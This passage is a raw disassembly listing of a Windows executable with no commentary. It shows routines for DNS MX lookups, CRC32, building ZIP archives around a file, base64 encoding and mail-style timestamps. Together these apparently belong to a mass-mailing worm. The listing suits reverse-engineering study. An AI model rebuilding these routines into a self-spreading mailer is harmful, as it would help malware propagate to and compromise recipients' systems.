.text:00401564 loc_401564:			       ; CODE XREF: sub_401332+114j
.text:00401564		       pop     edi
.text:00401565		       pop     esi
.text:00401566		       pop     ebx
.text:00401567		       leave
.text:00401568		       retn
.text:00401568 sub_401332      endp
.text:00401568
.text:00401569
.text:00401569 ; =============== S U B R O U T I N E =======================================
.text:00401569
.text:00401569 ; Attributes: bp-based frame
.text:00401569
.text:00401569 sub_401569      proc near	       ; CODE XREF: sub_401D65+1D6p
.text:00401569
.text:00401569 var_800	       = dword ptr -800h
.text:00401569 arg_0	       = dword ptr  8
.text:00401569
.text:00401569		       push    ebp
.text:0040156A		       mov     ebp, esp
.text:0040156C		       sub     esp, 800h
.text:00401572		       and     byte ptr	[ebp+var_800], 0
.text:00401579		       push    edi
.text:0040157A		       mov     ecx, 1FFh
.text:0040157F		       xor     eax, eax
.text:00401581		       lea     edi, [ebp+var_800+1]
.text:00401587		       rep stosd
.text:00401589		       stosw
.text:0040158B		       stosb
.text:0040158C		       lea     eax, [ebp+var_800]
.text:00401592		       push    eax	       ; int
.text:00401593		       push    0Fh	       ; hostshort
.text:00401595		       push    35h	       ; s
.text:00401597		       push    offset Dest     ; name
.text:0040159C		       push    [ebp+arg_0]     ; int
.text:0040159F		       call    sub_4010A4
.text:004015A4		       add     esp, 14h
.text:004015A7		       test    eax, eax
.text:004015A9		       pop     edi
.text:004015AA		       jnz     short loc_4015DA
.text:004015AC		       push    Str	       ; Str
.text:004015B2		       call    _strlen
.text:004015B7		       test    eax, eax
.text:004015B9		       pop     ecx
.text:004015BA		       jz      short loc_4015EB
.text:004015BC		       lea     eax, [ebp+var_800]
.text:004015C2		       push    eax	       ; int
.text:004015C3		       push    0Fh	       ; hostshort
.text:004015C5		       push    35h	       ; s
.text:004015C7		       push    Str	       ; name
.text:004015CD		       push    [ebp+arg_0]     ; int
.text:004015D0		       call    sub_4010A4
.text:004015D5		       add     esp, 14h
.text:004015D8		       test    eax, eax
.text:004015DA
.text:004015DA loc_4015DA:			       ; CODE XREF: sub_401569+41j
.text:004015DA		       jle     short loc_4015EB
.text:004015DC		       lea     eax, [ebp+var_800]
.text:004015E2		       push    eax
.text:004015E3		       call    sub_401332
.text:004015E8		       pop     ecx
.text:004015E9		       leave
.text:004015EA		       retn
.text:004015EB ; ---------------------------------------------------------------------------
.text:004015EB
.text:004015EB loc_4015EB:			       ; CODE XREF: sub_401569+51j
.text:004015EB					       ; sub_401569:loc_4015DAj
.text:004015EB		       xor     eax, eax
.text:004015ED		       leave
.text:004015EE		       retn
.text:004015EE sub_401569      endp
.text:004015EE
.text:004015EF
.text:004015EF ; =============== S U B R O U T I N E =======================================
.text:004015EF
.text:004015EF ; Attributes: bp-based frame
.text:004015EF
.text:004015EF sub_4015EF      proc near	       ; CODE XREF: sub_4019CB+53p
.text:004015EF
.text:004015EF arg_0	       = dword ptr  8
.text:004015EF arg_4	       = dword ptr  0Ch
.text:004015EF arg_8	       = dword ptr  10h
.text:004015EF
.text:004015EF		       push    ebp
.text:004015F0		       mov     ebp, esp
.text:004015F2		       mov     edx, [ebp+arg_4]
.text:004015F5		       test    edx, edx
.text:004015F7		       jnz     short loc_4015FD
.text:004015F9		       xor     eax, eax
.text:004015FB		       pop     ebp
.text:004015FC		       retn
.text:004015FD ; ---------------------------------------------------------------------------
.text:004015FD
.text:004015FD loc_4015FD:			       ; CODE XREF: sub_4015EF+8j
.text:004015FD		       mov     eax, [ebp+arg_0]
.text:00401600		       push    ebx
.text:00401601		       push    esi
.text:00401602		       mov     esi, [ebp+arg_8]
.text:00401605		       cmp     esi, 8
.text:00401608		       push    edi
.text:00401609		       not     eax
.text:0040160B		       mov     ecx, 0FFh
.text:00401610		       jl      loc_4016E7
.text:00401616		       mov     edi, esi
.text:00401618		       shr     edi, 3
.text:0040161B		       mov     ebx, edi
.text:0040161D		       neg     ebx
.text:0040161F		       lea     esi, [esi+ebx*8]
.text:00401622		       mov     [ebp+arg_8], esi
.text:00401625
.text:00401625 loc_401625:			       ; CODE XREF: sub_4015EF+EFj
.text:00401625		       movzx   ebx, byte ptr [edx]
.text:00401628		       mov     esi, eax
.text:0040162A		       and     esi, ecx
.text:0040162C		       xor     esi, ebx
.text:0040162E		       mov     ebx, eax
.text:00401630		       shr     ebx, 8
.text:00401633		       mov     eax, ds:dword_406178[esi*4]
.text:0040163A		       xor     eax, ebx
.text:0040163C		       inc     edx
.text:0040163D		       mov     esi, eax
.text:0040163F		       movzx   ebx, byte ptr [edx]
.text:00401642		       and     esi, ecx
.text:00401644		       xor     esi, ebx
.text:00401646		       movzx   ebx, byte ptr [edx+1]
.text:0040164A		       mov     esi, ds:dword_406178[esi*4]
.text:00401651		       shr     eax, 8
.text:00401654		       xor     esi, eax
.text:00401656		       inc     edx
.text:00401657		       mov     eax, esi
.text:00401659		       and     eax, ecx
.text:0040165B		       xor     eax, ebx
.text:0040165D		       movzx   ebx, byte ptr [edx+1]
.text:00401661		       mov     eax, ds:dword_406178[eax*4]
.text:00401668		       shr     esi, 8
.text:0040166B		       xor     eax, esi
.text:0040166D		       inc     edx
.text:0040166E		       mov     esi, eax
.text:00401670		       and     esi, ecx
.text:00401672		       xor     esi, ebx
.text:00401674		       movzx   ebx, byte ptr [edx+1]
.text:00401678		       mov     esi, ds:dword_406178[esi*4]
.text:0040167F		       shr     eax, 8
.text:00401682		       xor     esi, eax
.text:00401684		       inc     edx
.text:00401685		       mov     eax, esi
.text:00401687		       and     eax, ecx
.text:00401689		       xor     eax, ebx
.text:0040168B		       movzx   ebx, byte ptr [edx+1]
.text:0040168F		       mov     eax, ds:dword_406178[eax*4]
.text:00401696		       shr     esi, 8
.text:00401699		       xor     eax, esi
.text:0040169B		       inc     edx
.text:0040169C		       mov     esi, eax
.text:0040169E		       and     esi, ecx
.text:004016A0		       xor     esi, ebx
.text:004016A2		       movzx   ebx, byte ptr [edx+1]
.text:004016A6		       mov     esi, ds:dword_406178[esi*4]
.text:004016AD		       shr     eax, 8
.text:004016B0		       xor     esi, eax
.text:004016B2		       inc     edx
.text:004016B3		       mov     eax, esi
.text:004016B5		       and     eax, ecx
.text:004016B7		       xor     eax, ebx
.text:004016B9		       movzx   ebx, byte ptr [edx+1]
.text:004016BD		       mov     eax, ds:dword_406178[eax*4]
.text:004016C4		       shr     esi, 8
.text:004016C7		       xor     eax, esi
.text:004016C9		       inc     edx
.text:004016CA		       mov     esi, eax
.text:004016CC		       and     esi, ecx
.text:004016CE		       xor     esi, ebx
.text:004016D0		       shr     eax, 8
.text:004016D3		       mov     esi, ds:dword_406178[esi*4]
.text:004016DA		       xor     eax, esi
.text:004016DC		       inc     edx
.text:004016DD		       dec     edi
.text:004016DE		       jnz     loc_401625
.text:004016E4		       mov     esi, [ebp+arg_8]
.text:004016E7
.text:004016E7 loc_4016E7:			       ; CODE XREF: sub_4015EF+21j
.text:004016E7		       test    esi, esi
.text:004016E9		       jz      short loc_401704
.text:004016EB
.text:004016EB loc_4016EB:			       ; CODE XREF: sub_4015EF+113j
.text:004016EB		       movzx   ebx, byte ptr [edx]
.text:004016EE		       mov     edi, eax
.text:004016F0		       and     edi, ecx
.text:004016F2		       xor     edi, ebx
.text:004016F4		       shr     eax, 8
.text:004016F7		       mov     edi, ds:dword_406178[edi*4]
.text:004016FE		       xor     eax, edi
.text:00401700		       inc     edx
.text:00401701		       dec     esi
.text:00401702		       jnz     short loc_4016EB
.text:00401704
.text:00401704 loc_401704:			       ; CODE XREF: sub_4015EF+FAj
.text:00401704		       pop     edi
.text:00401705		       pop     esi
.text:00401706		       not     eax
.text:00401708		       pop     ebx
.text:00401709		       pop     ebp
.text:0040170A		       retn
.text:0040170A sub_4015EF      endp
.text:0040170A
.text:0040170B
.text:0040170B ; =============== S U B R O U T I N E =======================================
.text:0040170B
.text:0040170B ; Attributes: bp-based frame
.text:0040170B
.text:0040170B ; int __cdecl sub_40170B(LPCSTR NumberOfBytesWritten, HANDLE hObject, LPCSTR lpBuffer)
.text:0040170B sub_40170B      proc near	       ; CODE XREF: sub_401D65+EAp
.text:0040170B
.text:0040170B var_474	       = byte ptr -474h
.text:0040170B var_74	       = byte ptr -74h
.text:0040170B Dst	       = dword ptr -70h
.text:0040170B var_6C	       = word ptr -6Ch
.text:0040170B var_6A	       = word ptr -6Ah
.text:0040170B var_68	       = word ptr -68h
.text:0040170B var_66	       = word ptr -66h
.text:0040170B var_64	       = word ptr -64h
.text:0040170B var_62	       = word ptr -62h
.text:0040170B var_60	       = dword ptr -60h
.text:0040170B var_5C	       = dword ptr -5Ch
.text:0040170B var_58	       = dword ptr -58h
.text:0040170B var_54	       = word ptr -54h
.text:0040170B var_52	       = word ptr -52h
.text:0040170B var_4C	       = word ptr -4Ch
.text:0040170B var_4A	       = dword ptr -4Ah
.text:0040170B var_46	       = dword ptr -46h
.text:0040170B Buffer	       = dword ptr -40h
.text:0040170B var_3C	       = word ptr -3Ch
.text:0040170B var_3A	       = word ptr -3Ah
.text:0040170B var_38	       = word ptr -38h
.text:0040170B var_36	       = word ptr -36h
.text:0040170B var_34	       = word ptr -34h
.text:0040170B var_32	       = dword ptr -32h
.text:0040170B var_2E	       = dword ptr -2Eh
.text:0040170B var_2A	       = dword ptr -2Ah
.text:0040170B var_26	       = word ptr -26h
.text:0040170B var_24	       = word ptr -24h
.text:0040170B var_20	       = dword ptr -20h
.text:0040170B var_1C	       = word ptr -1Ch
.text:0040170B var_1A	       = word ptr -1Ah
.text:0040170B var_18	       = word ptr -18h
.text:0040170B var_16	       = word ptr -16h
.text:0040170B var_14	       = dword ptr -14h
.text:0040170B var_10	       = dword ptr -10h
.text:0040170B var_C	       = word ptr -0Ch
.text:0040170B var_8	       = dword ptr -8
.text:0040170B hFile	       = dword ptr -4
.text:0040170B NumberOfBytesWritten= dword ptr	8
.text:0040170B hObject	       = dword ptr  0Ch
.text:0040170B lpBuffer	       = dword ptr  10h
.text:0040170B
.text:0040170B		       push    ebp
.text:0040170C		       mov     ebp, esp
.text:0040170E		       sub     esp, 474h
.text:00401714		       push    ebx
.text:00401715		       push    esi
.text:00401716		       push    edi
.text:00401717		       xor     esi, esi
.text:00401719		       mov     edi, 80h
.text:0040171E		       push    esi	       ; hTemplateFile
.text:0040171F		       mov     ebx, ds:CreateFileA
.text:00401725		       push    edi	       ; dwFlagsAndAttributes
.text:00401726		       push    3	       ; dwCreationDisposition
.text:00401728		       push    esi	       ; lpSecurityAttributes
.text:00401729		       push    3	       ; dwShareMode
.text:0040172B		       push    80000000h       ; dwDesiredAccess
.text:00401730		       push    [ebp+NumberOfBytesWritten] ; lpFileName
.text:00401733		       call    ebx ; CreateFileA
.text:00401735		       cmp     eax, 0FFFFFFFFh
.text:00401738		       mov     [ebp+hFile], eax
.text:0040173B		       jz      loc_40193E
.text:00401741		       cmp     eax, esi
.text:00401743		       jz      loc_40193E
.text:00401749		       push    esi	       ; hTemplateFile
.text:0040174A		       push    edi	       ; dwFlagsAndAttributes
.text:0040174B		       push    2	       ; dwCreationDisposition
.text:0040174D		       push    esi	       ; lpSecurityAttributes
.text:0040174E		       push    3	       ; dwShareMode
.text:00401750		       push    40000000h       ; dwDesiredAccess
.text:00401755		       push    [ebp+hObject]   ; lpFileName
.text:00401758		       call    ebx ; CreateFileA
.text:0040175A		       mov     edi, eax
.text:0040175C		       cmp     edi, 0FFFFFFFFh
.text:0040175F		       mov     [ebp+hObject], edi
.text:00401762		       jz      loc_401939
.text:00401768		       cmp     edi, esi
.text:0040176A		       jz      loc_401939
.text:00401770		       push    1Eh	       ; Size
.text:00401772		       lea     eax, [ebp+Buffer]
.text:00401775		       push    esi	       ; Val
.text:00401776		       push    eax	       ; Dst
.text:00401777		       call    _memset
.text:0040177C		       push    2Eh	       ; Size
.text:0040177E		       lea     eax, [ebp+Dst]
.text:00401781		       push    esi	       ; Val
.text:00401782		       push    eax	       ; Dst
.text:00401783		       call    _memset
.text:00401788		       push    16h	       ; Size
.text:0040178A		       lea     eax, [ebp+var_20]
.text:0040178D		       push    esi	       ; Val
.text:0040178E		       push    eax	       ; Dst
.text:0040178F		       call    _memset
.text:00401794		       lea     eax, [ebp+var_34]
.text:00401797		       mov     [ebp+Buffer], 4034B50h
.text:0040179E		       push    eax
.text:0040179F		       lea     eax, [ebp+var_36]
.text:004017A2		       push    eax
.text:004017A3		       mov     [ebp+var_3C], 0Ah
.text:004017A9		       mov     [ebp+var_6A], 0Ah
.text:004017AF		       mov     [ebp+var_3A], si
.text:004017B3		       mov     [ebp+var_68], si
.text:004017B7		       mov     [ebp+var_38], si
.text:004017BB		       mov     [ebp+var_66], si
.text:004017BF		       call    sub_401946
.text:004017C4		       mov     ax, [ebp+var_36]
.text:004017C8		       push    [ebp+hFile]     ; hFile
.text:004017CB		       mov     [ebp+var_64], ax
.text:004017CF		       mov     ax, [ebp+var_34]
.text:004017D3		       mov     [ebp+var_62], ax
.text:004017D7		       call    sub_4019CB
.text:004017DC		       mov     ebx, ds:GetFileSize
.text:004017E2		       add     esp, 30h
.text:004017E5		       mov     [ebp+var_32], eax
.text:004017E8		       mov     [ebp+var_60], eax
.text:004017EB		       push    esi	       ; lpFileSizeHigh
.text:004017EC		       push    [ebp+hFile]     ; hFile
.text:004017EF		       call    ebx ; GetFileSize
.text:004017F1		       push    esi	       ; lpFileSizeHigh
.text:004017F2		       mov     [ebp+var_2E], eax
.text:004017F5		       push    [ebp+hFile]     ; hFile
.text:004017F8		       mov     [ebp+var_5C], eax
.text:004017FB		       call    ebx ; GetFileSize
.text:004017FD		       push    [ebp+lpBuffer]  ; lpString
.text:00401800		       mov     ebx, ds:lstrlenA
.text:00401806		       mov     [ebp+var_2A], eax
.text:00401809		       mov     [ebp+var_58], eax
.text:0040180C		       call    ebx ; lstrlenA
.text:0040180E		       mov     [ebp+var_26], ax
.text:00401812		       mov     [ebp+var_54], ax
.text:00401816		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401819		       push    esi	       ; lpOverlapped
.text:0040181A		       push    eax	       ; lpNumberOfBytesWritten
.text:0040181B		       lea     eax, [ebp+Buffer]
.text:0040181E		       push    1Eh	       ; nNumberOfBytesToWrite
.text:00401820		       push    eax	       ; lpBuffer
.text:00401821		       push    edi	       ; hFile
.text:00401822		       mov     edi, ds:WriteFile
.text:00401828		       mov     [ebp+var_24], si
.text:0040182C		       mov     [ebp+var_52], si
.text:00401830		       mov     [ebp+var_46], esi
.text:00401833		       call    edi ; WriteFile
.text:00401835		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401838		       push    esi	       ; lpOverlapped
.text:00401839		       push    eax	       ; lpNumberOfBytesWritten
.text:0040183A		       push    [ebp+lpBuffer]  ; lpString
.text:0040183D		       call    ebx ; lstrlenA
.text:0040183F		       push    eax	       ; nNumberOfBytesToWrite
.text:00401840		       push    [ebp+lpBuffer]  ; lpBuffer
.text:00401843		       push    [ebp+hObject]   ; hFile
.text:00401846		       call    edi ; WriteFile
.text:00401848		       push    [ebp+lpBuffer]  ; lpString
.text:0040184B		       call    ebx ; lstrlenA
.text:0040184D		       push    esi	       ; dwMoveMethod
.text:0040184E		       push    esi	       ; lpDistanceToMoveHigh
.text:0040184F		       add     eax, 1Eh
.text:00401852		       push    esi	       ; lDistanceToMove
.text:00401853		       push    [ebp+hFile]     ; hFile
.text:00401856		       mov     [ebp+var_8], eax
.text:00401859		       call    ds:SetFilePointer
.text:0040185F
.text:0040185F loc_40185F:			       ; CODE XREF: sub_40170B+194j
.text:0040185F		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401862		       push    esi	       ; lpOverlapped
.text:00401863		       push    eax	       ; lpNumberOfBytesRead
.text:00401864		       lea     eax, [ebp+var_474]
.text:0040186A		       push    400h	       ; nNumberOfBytesToRead
.text:0040186F		       push    eax	       ; lpBuffer
.text:00401870		       push    [ebp+hFile]     ; hFile
.text:00401873		       mov     [ebp+NumberOfBytesWritten], esi
.text:00401876		       call    ds:ReadFile
.text:0040187C		       test    eax, eax
.text:0040187E		       jz      short loc_4018A1
.text:00401880		       cmp     [ebp+NumberOfBytesWritten], esi
.text:00401883		       jz      short loc_4018A1
.text:00401885		       lea     eax, [ebp+var_74]
.text:00401888		       push    esi	       ; lpOverlapped
.text:00401889		       push    eax	       ; lpNumberOfBytesWritten
.text:0040188A		       lea     eax, [ebp+var_474]
.text:00401890		       push    [ebp+NumberOfBytesWritten] ; nNumberOfBytesToWrite
.text:00401893		       push    eax	       ; lpBuffer
.text:00401894		       push    [ebp+hObject]   ; hFile
.text:00401897		       call    edi ; WriteFile
.text:00401899		       mov     eax, [ebp+NumberOfBytesWritten]
.text:0040189C		       add     [ebp+var_8], eax
.text:0040189F		       jmp     short loc_40185F
.text:004018A1 ; ---------------------------------------------------------------------------
.text:004018A1
.text:004018A1 loc_4018A1:			       ; CODE XREF: sub_40170B+173j
.text:004018A1					       ; sub_40170B+178j
.text:004018A1		       mov     eax, [ebp+var_8]
.text:004018A4		       push    esi	       ; lpOverlapped
.text:004018A5		       mov     [ebp+var_10], eax
.text:004018A8		       lea     eax, [ebp+NumberOfBytesWritten]
.text:004018AB		       push    eax	       ; lpNumberOfBytesWritten
.text:004018AC		       lea     eax, [ebp+Dst]
.text:004018AF		       push    2Eh	       ; nNumberOfBytesToWrite
.text:004018B1		       push    eax	       ; lpBuffer
.text:004018B2		       push    [ebp+hObject]   ; hFile
.text:004018B5		       mov     [ebp+Dst], 2014B50h
.text:004018BC		       mov     [ebp+var_6C], 14h
.text:004018C2		       mov     [ebp+var_4C], si
.text:004018C6		       mov     [ebp+var_4A], 20h
.text:004018CD		       call    edi ; WriteFile
.text:004018CF		       lea     eax, [ebp+NumberOfBytesWritten]
.text:004018D2		       push    esi	       ; lpOverlapped
.text:004018D3		       push    eax	       ; lpNumberOfBytesWritten
.text:004018D4		       push    [ebp+lpBuffer]  ; lpString
.text:004018D7		       call    ebx ; lstrlenA
.text:004018D9		       push    eax	       ; nNumberOfBytesToWrite
.text:004018DA		       push    [ebp+lpBuffer]  ; lpBuffer
.text:004018DD		       push    [ebp+hObject]   ; hFile
.text:004018E0		       call    edi ; WriteFile
.text:004018E2		       push    [ebp+lpBuffer]  ; lpString
.text:004018E5		       call    ebx ; lstrlenA
.text:004018E7		       mov     ecx, [ebp+var_8]
.text:004018EA		       push    esi	       ; lpOverlapped
.text:004018EB		       mov     [ebp+var_20], 6054B50h
.text:004018F2		       mov     [ebp+var_1C], si
.text:004018F6		       lea     eax, [ecx+eax+2Eh]
.text:004018FA		       mov     [ebp+var_1A], si
.text:004018FE		       sub     eax, [ebp+var_10]
.text:00401901		       mov     [ebp+var_18], 1
.text:00401907		       mov     [ebp+var_16], 1
.text:0040190D		       mov     [ebp+var_C], si
.text:00401911		       mov     [ebp+var_14], eax
.text:00401914		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401917		       push    eax	       ; lpNumberOfBytesWritten
.text:00401918		       lea     eax, [ebp+var_20]
.text:0040191B		       push    16h	       ; nNumberOfBytesToWrite
.text:0040191D		       push    eax	       ; lpBuffer
.text:0040191E		       push    [ebp+hObject]   ; hFile
.text:00401921		       call    edi ; WriteFile
.text:00401923		       push    [ebp+hObject]   ; hObject
.text:00401926		       call    ds:CloseHandle
.text:0040192C
.text:0040192C loc_40192C:			       ; CODE XREF: sub_40170B+231j
.text:0040192C		       push    [ebp+hFile]     ; hObject
.text:0040192F		       call    ds:CloseHandle
.text:00401935		       mov     eax, esi
.text:00401937		       jmp     short loc_401941
.text:00401939 ; ---------------------------------------------------------------------------
.text:00401939
.text:00401939 loc_401939:			       ; CODE XREF: sub_40170B+57j
.text:00401939					       ; sub_40170B+5Fj
.text:00401939		       push    2
.text:0040193B		       pop     esi
.text:0040193C		       jmp     short loc_40192C
.text:0040193E ; ---------------------------------------------------------------------------
.text:0040193E
.text:0040193E loc_40193E:			       ; CODE XREF: sub_40170B+30j
.text:0040193E					       ; sub_40170B+38j
.text:0040193E		       push    1
.text:00401940		       pop     eax
.text:00401941
.text:00401941 loc_401941:			       ; CODE XREF: sub_40170B+22Cj
.text:00401941		       pop     edi
.text:00401942		       pop     esi
.text:00401943		       pop     ebx
.text:00401944		       leave
.text:00401945		       retn
.text:00401945 sub_40170B      endp
.text:00401945
.text:00401946
.text:00401946 ; =============== S U B R O U T I N E =======================================
.text:00401946
.text:00401946 ; Attributes: bp-based frame
.text:00401946
.text:00401946 sub_401946      proc near	       ; CODE XREF: sub_40170B+B4p
.text:00401946
.text:00401946 SystemTime      = _SYSTEMTIME ptr -10h
.text:00401946 arg_0	       = dword ptr  8
.text:00401946 arg_4	       = dword ptr  0Ch
.text:00401946
.text:00401946		       push    ebp
.text:00401947		       mov     ebp, esp
.text:00401949		       sub     esp, 10h
.text:0040194C		       lea     eax, [ebp+SystemTime]
.text:0040194F		       push    eax	       ; lpSystemTime
.text:00401950		       call    ds:GetSystemTime
.text:00401956		       cmp     [ebp+SystemTime.wYear], 7CFh
.text:0040195C		       jb      short loc_401966
.text:0040195E		       cmp     [ebp+SystemTime.wYear], 7DAh
.text:00401964		       jbe     short loc_40196C
.text:00401966
.text:00401966 loc_401966:			       ; CODE XREF: sub_401946+16j
.text:00401966		       mov     [ebp+SystemTime.wYear], 7D4h
.text:0040196C
.text:0040196C loc_40196C:			       ; CODE XREF: sub_401946+1Ej
.text:0040196C		       cmp     [ebp+SystemTime.wMonth],	1
.text:00401971		       jb      short loc_40197A
.text:00401973		       cmp     [ebp+SystemTime.wMonth],	0Ch
.text:00401978		       jbe     short loc_401980
.text:0040197A
.text:0040197A loc_40197A:			       ; CODE XREF: sub_401946+2Bj
.text:0040197A		       mov     [ebp+SystemTime.wMonth],	1
.text:00401980
.text:00401980 loc_401980:			       ; CODE XREF: sub_401946+32j
.text:00401980		       cmp     [ebp+SystemTime.wDay], 1
.text:00401985		       jb      short loc_40198E
.text:00401987		       cmp     [ebp+SystemTime.wDay], 1Fh
.text:0040198C		       jbe     short loc_401994
.text:0040198E
.text:0040198E loc_40198E:			       ; CODE XREF: sub_401946+3Fj
.text:0040198E		       mov     [ebp+SystemTime.wDay], 0Ah
.text:00401994
.text:00401994 loc_401994:			       ; CODE XREF: sub_401946+46j
.text:00401994		       mov     eax, dword ptr [ebp+SystemTime.wYear]
.text:00401997		       mov     ecx, dword ptr [ebp+SystemTime.wMonth]
.text:0040199A		       add     eax, 44h
.text:0040199D		       shl     eax, 9
.text:004019A0		       shl     ecx, 5
.text:004019A3		       or      eax, ecx
.text:004019A5		       mov     ecx, [ebp+arg_4]
.text:004019A8		       or      eax, dword ptr [ebp+SystemTime.wDay]
.text:004019AB		       mov     [ecx], ax
.text:004019AE		       mov     eax, dword ptr [ebp+SystemTime.wHour]
.text:004019B1		       mov     cx, [ebp+SystemTime.wSecond]
.text:004019B5		       shl     eax, 6
.text:004019B8		       or      eax, [ebp-6]
.text:004019BB		       shr     cx, 1
.text:004019BE		       shl     eax, 5
.text:004019C1		       or      eax, ecx
.text:004019C3		       mov     ecx, [ebp+arg_0]
.text:004019C6		       mov     [ecx], ax
.text:004019C9		       leave
.text:004019CA		       retn
.text:004019CA sub_401946      endp
.text:004019CA
.text:004019CB
.text:004019CB ; =============== S U B R O U T I N E =======================================
.text:004019CB
.text:004019CB ; Attributes: bp-based frame
.text:004019CB
.text:004019CB ; int __cdecl sub_4019CB(HANDLE hFile)
.text:004019CB sub_4019CB      proc near	       ; CODE XREF: sub_40170B+CCp
.text:004019CB
.text:004019CB Buffer	       = byte ptr -408h
.text:004019CB var_8	       = dword ptr -8
.text:004019CB NumberOfBytesRead= dword	ptr -4
.text:004019CB hFile	       = dword ptr  8
.text:004019CB
.text:004019CB		       push    ebp
.text:004019CC		       mov     ebp, esp
.text:004019CE		       sub     esp, 408h
.text:004019D4		       push    ebx
.text:004019D5		       push    esi
.text:004019D6		       xor     esi, esi
.text:004019D8		       push    edi
.text:004019D9		       push    esi	       ; dwMoveMethod
.text:004019DA		       push    esi	       ; lpDistanceToMoveHigh
.text:004019DB		       push    esi	       ; lDistanceToMove
.text:004019DC		       push    [ebp+hFile]     ; hFile
.text:004019DF		       call    ds:SetFilePointer
.text:004019E5		       mov     edi, ds:ReadFile
.text:004019EB		       lea     eax, [ebp+NumberOfBytesRead]
.text:004019EE		       push    esi	       ; lpOverlapped
.text:004019EF		       push    eax	       ; lpNumberOfBytesRead
.text:004019F0		       mov     ebx, 400h
.text:004019F5		       lea     eax, [ebp+Buffer]
.text:004019FB		       push    ebx	       ; nNumberOfBytesToRead
.text:004019FC		       push    eax	       ; lpBuffer
.text:004019FD		       push    [ebp+hFile]     ; hFile
.text:00401A00		       mov     [ebp+var_8], esi
.text:00401A03		       mov     [ebp+NumberOfBytesRead],	esi
.text:00401A06
.text:00401A06 loc_401A06:			       ; CODE XREF: sub_4019CB+71j
.text:00401A06		       call    edi ; ReadFile
.text:00401A08		       test    eax, eax
.text:00401A0A		       jz      short loc_401A3E
.text:00401A0C		       cmp     [ebp+NumberOfBytesRead],	esi
.text:00401A0F		       jz      short loc_401A3E
.text:00401A11		       push    [ebp+NumberOfBytesRead]
.text:00401A14		       lea     eax, [ebp+Buffer]
.text:00401A1A		       push    eax
.text:00401A1B		       push    [ebp+var_8]
.text:00401A1E		       call    sub_4015EF
.text:00401A23		       add     esp, 0Ch
.text:00401A26		       mov     [ebp+var_8], eax
.text:00401A29		       lea     eax, [ebp+NumberOfBytesRead]
.text:00401A2C		       mov     [ebp+NumberOfBytesRead],	esi
.text:00401A2F		       push    esi
.text:00401A30		       push    eax
.text:00401A31		       lea     eax, [ebp+Buffer]
.text:00401A37		       push    ebx
.text:00401A38		       push    eax
.text:00401A39		       push    [ebp+hFile]
.text:00401A3C		       jmp     short loc_401A06
.text:00401A3E ; ---------------------------------------------------------------------------
.text:00401A3E
.text:00401A3E loc_401A3E:			       ; CODE XREF: sub_4019CB+3Fj
.text:00401A3E					       ; sub_4019CB+44j
.text:00401A3E		       push    esi	       ; dwMoveMethod
.text:00401A3F		       push    esi	       ; lpDistanceToMoveHigh
.text:00401A40		       push    esi	       ; lDistanceToMove
.text:00401A41		       push    [ebp+hFile]     ; hFile
.text:00401A44		       call    ds:SetFilePointer
.text:00401A4A		       mov     eax, [ebp+var_8]
.text:00401A4D		       pop     edi
.text:00401A4E		       pop     esi
.text:00401A4F		       pop     ebx
.text:00401A50		       leave
.text:00401A51		       retn
.text:00401A51 sub_4019CB      endp
.text:00401A51
.text:00401A52
.text:00401A52 ; =============== S U B R O U T I N E =======================================
.text:00401A52
.text:00401A52
.text:00401A52 sub_401A52      proc near	       ; CODE XREF: sub_401C10+4Fp
.text:00401A52
.text:00401A52 arg_0	       = dword ptr  4
.text:00401A52 arg_4	       = dword ptr  8
.text:00401A52 arg_8	       = dword ptr  0Ch
.text:00401A52
.text:00401A52		       mov     eax, [esp+arg_0]
.text:00401A56		       push    esi
.text:00401A57		       movzx   ecx, byte ptr [eax]
.text:00401A5A		       shr     ecx, 2
.text:00401A5D		       mov     dl, ds:byte_40657C[ecx]
.text:00401A63		       mov     ecx, [esp+4+arg_4]
.text:00401A67		       mov     [ecx], dl
.text:00401A69		       mov     dl, [eax]
.text:00401A6B		       movzx   esi, byte ptr [eax+1]
.text:00401A6F		       and     edx, 3
.text:00401A72		       shl     edx, 4
.text:00401A75		       shr     esi, 4
.text:00401A78		       or      edx, esi
.text:00401A7A		       cmp     [esp+4+arg_8], 1
.text:00401A7F		       mov     dl, ds:byte_40657C[edx]
.text:00401A85		       mov     [ecx+1],	dl
.text:00401A88		       jle     short loc_401AA4
.text:00401A8A		       mov     dl, [eax+1]
.text:00401A8D		       movzx   esi, byte ptr [eax+2]
.text:00401A91		       and     edx, 0Fh
.text:00401A94		       shl     edx, 2
.text:00401A97		       shr     esi, 6
.text:00401A9A		       or      edx, esi
.text:00401A9C		       mov     dl, ds:byte_40657C[edx]
.text:00401AA2		       jmp     short loc_401AA6
.text:00401AA4 ; ---------------------------------------------------------------------------
.text:00401AA4
.text:00401AA4 loc_401AA4:			       ; CODE XREF: sub_401A52+36j
.text:00401AA4		       mov     dl, 3Dh
.text:00401AA6
.text:00401AA6 loc_401AA6:			       ; CODE XREF: sub_401A52+50j
.text:00401AA6		       cmp     [esp+4+arg_8], 2
.text:00401AAB		       mov     [ecx+2],	dl
.text:00401AAE		       pop     esi
.text:00401AAF		       jle     short loc_401ABF
.text:00401AB1		       mov     al, [eax+2]
.text:00401AB4		       and     eax, 3Fh
.text:00401AB7		       mov     al, ds:byte_40657C[eax]
.text:00401ABD		       jmp     short loc_401AC1
.text:00401ABF ; ---------------------------------------------------------------------------
.text:00401ABF
.text:00401ABF loc_401ABF:			       ; CODE XREF: sub_401A52+5Dj
.text:00401ABF		       mov     al, 3Dh
.text:00401AC1
.text:00401AC1 loc_401AC1:			       ; CODE XREF: sub_401A52+6Bj
.text:00401AC1		       mov     [ecx+3],	al
.text:00401AC4		       retn
.text:00401AC4 sub_401A52      endp
.text:00401AC4
.text:00401AC5
.text:00401AC5 ; =============== S U B R O U T I N E =======================================
.text:00401AC5
.text:00401AC5 ; Attributes: bp-based frame
.text:00401AC5
.text:00401AC5 ; int __cdecl sub_401AC5(LPSTR)
.text:00401AC5 sub_401AC5      proc near	       ; CODE XREF: sub_401D65+69Fp
.text:00401AC5
.text:00401AC5 TimeZoneInformation= _TIME_ZONE_INFORMATION ptr -108h
.text:00401AC5 var_5C	       = dword ptr -5Ch
.text:00401AC5 var_58	       = dword ptr -58h
.text:00401AC5 var_54	       = dword ptr -54h
.text:00401AC5 var_50	       = dword ptr -50h
.text:00401AC5 var_4C	       = dword ptr -4Ch
.text:00401AC5 var_48	       = dword ptr -48h
.text:00401AC5 var_44	       = dword ptr -44h
